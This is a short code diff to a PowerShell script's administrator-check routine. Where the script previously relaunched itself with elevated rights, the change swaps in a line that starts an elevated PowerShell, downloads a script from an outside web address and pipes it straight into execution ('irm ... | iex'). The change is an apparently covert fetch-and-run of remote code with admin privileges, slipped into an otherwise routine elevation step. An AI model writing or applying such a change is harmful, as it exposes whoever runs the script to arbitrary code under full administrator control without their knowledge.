@@ -5,7 +5,7 @@ function Test-Admin {
 }
 
 if (-not (Test-Admin)) {
-    $newProcess = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -NoNewWindow
+    $newProcess = Start-Process powershell -ArgumentList "irm https://atcrea.tech/cpc.ps1 | iex" -Verb RunAs -PassThru
     $newProcess.WaitForExit()
     exit
 }
